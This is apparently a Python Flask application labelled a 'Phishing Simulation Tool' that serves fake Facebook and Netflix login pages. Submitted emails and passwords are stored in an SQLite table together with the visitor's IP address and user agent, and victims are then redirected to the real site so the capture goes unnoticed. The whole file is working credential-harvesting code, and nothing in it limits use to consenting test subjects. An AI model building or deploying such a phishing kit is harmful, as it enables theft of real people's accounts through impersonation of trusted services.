from flask import Flask, render_template, request, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Database setup
DB_NAME = "backend/dbs/moh.db"

def init_db():
    """Initialize the SQLite database to store logs"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            page TEXT,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp TEXT
        )
    """)
    conn.commit()
    conn.close()

@app.route('/')
def home():
    """Landing page (could redirect to an actual site)"""
    return "Welcome to Phishing Simulation Tool"

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    """Fake Facebook login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials("Facebook", username, password)
        return redirect("https://www.facebook.com/")  # Redirect after capturing
        
    return render_template('facebook.html')

@app.route('/netflix', methods=['GET', 'POST'])
def netflix():
    """Fake Netflix login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('password')
        log_credentials("Netflix", username, password)
        return redirect("https://www.netflix.com/")  # Redirect after capturing

    return render_template('netflix.html')

def log_credentials(page, username, password):
    """Log stolen credentials into SQLite database"""
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (page, username, password, ip, user_agent, timestamp))
    
    conn.commit()
    conn.close()

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
